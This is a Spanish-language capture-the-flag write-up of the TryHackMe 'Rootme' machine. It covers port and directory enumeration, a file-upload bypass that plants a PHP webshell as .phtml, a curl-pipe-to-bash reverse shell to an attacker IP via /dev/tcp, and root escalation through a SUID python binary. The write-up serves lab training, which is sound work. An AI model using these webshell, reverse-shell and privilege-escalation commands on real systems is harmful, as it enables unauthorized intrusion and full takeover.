## 1. Introducción
### 1.1 Antecedentes
**Rootme** es una máquina Linux de dificultad _Easy_ en la plataforma **TryHackMe**, orientada a la práctica de técnicas básicas de enumeración, explotación web y escalada de privilegios en entornos Linux.
### 1.2 Objetivos

- Identificar servicios expuestos.
- Enumerar la aplicación web.
- Obtener acceso remoto al sistema.
- Escalar privilegios hasta **root**.

---
## 2. Enumeración
### 2.1 Reconocimiento inicial
Comenzamos identificando la IP objetivo y verificando conectividad:
```bash
❯ ping -c 1 10.48.147.3
```
El host responde correctamente, confirmando que está activo.
### 2.2 Nmap
Realizamos un escaneo completo de puertos:
```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 10.48.147.3 -oN allports --open
```
### Puertos abiertos:

- **22/tcp** → SSH
- **80/tcp** → HTTP

Escaneo detallado:
```bash
❯ nmap -p22,80 -sCV -Pn -oN targeted 10.48.147.3
```
Hallazgos importantes:

- **OpenSSH 8.2p1 (Ubuntu)**
- **Apache 2.4.41 (Ubuntu)**
- Cookie `PHPSESSID` sin flag `HttpOnly`
- Título del sitio: **HackIT - Home**

### 2.3 Enumeración web
Accedemos a:
```
http://10.48.147.3/
```
Se observa la página principal del sitio.
<img width="1116" height="483" alt="image" src="https://github.com/user-attachments/assets/dc1b110b-20ff-43c1-8bae-e2bd047d20a4" />

Se utilizó:
```bash
❯ wfuzz -c --hc 403,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.48.147.3/FUZZ
```
### Directorios encontrados:

- `/uploads`
- `/panel`

## 3. Explotación
### 3.1 Subida de archivo .php malicioso
En `/panel` se permitía la subida de archivos.

Se creó una webshell básica:
```php
<?php echo system($_GET["cmd"]); ?>
```
Inicialmente no se permitían archivos `.php`, por lo que se renombró a:
```
webshell.phtml
```
El archivo fue aceptado correctamente.

Se verificó en:
```
/uploads
```
Al acceder:
```
http://10.48.147.3/uploads/webshell.phtml?cmd=id
```
Resultado:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Confirmación de ejecución remota de comandos (RCE).
### 3.2 Obtención de reverse shell
Se creó un script para establecer conexión reversa.

En la máquina atacante:
```bash
❯ mkdir server  
❯ cd server
```
Se creo el archivo `index.html`:
```
#!/bin/bash  
bash -i >& /dev/tcp/192.168.139.228/8080 0>&1
```
Se levantó servidor HTTP:
```bash
❯ python3 -m http.server 8001
```
Listener:
```bash
❯ nc -lvnp 8080
```
Desde la víctima:
```
http://10.48.147.3/uploads/webshell.phtml?cmd=curl%20192.168.139.228:8001%20|%20bash
```
Se obtuvo shell como:
```
www-data
```
## 4. Post-Exxplotación
### 4.1 Búsqueda de binarios SUID
Tras obtener acceso al sistema:
```bash
❯ find / -perm -u=s -type f 2>/dev/null
```
Se encontró:
```
/usr/bin/python
```
Python con bit SUID activo.
### 4.2 Escalada de Privilegios
En la máquina atacante se creó:
```python
import os  
os.setuid(0)  
os.system('bash')
```
Se sirvió nuevamente por HTTP y desde la víctima:
```bash
❯ wget 192.168.139.228:8001/hackeo.py  
❯ python hackeo.py
```
Resultado:
```
root
```

